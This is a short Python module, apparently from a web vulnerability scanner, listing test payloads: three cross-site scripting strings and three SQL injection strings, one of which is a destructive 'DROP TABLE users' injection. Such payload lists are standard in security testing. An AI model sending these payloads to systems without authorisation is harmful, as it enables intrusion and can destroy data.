# scanner/payloads.py

xss_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>"
]

sqli_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR 1=1 --"
]
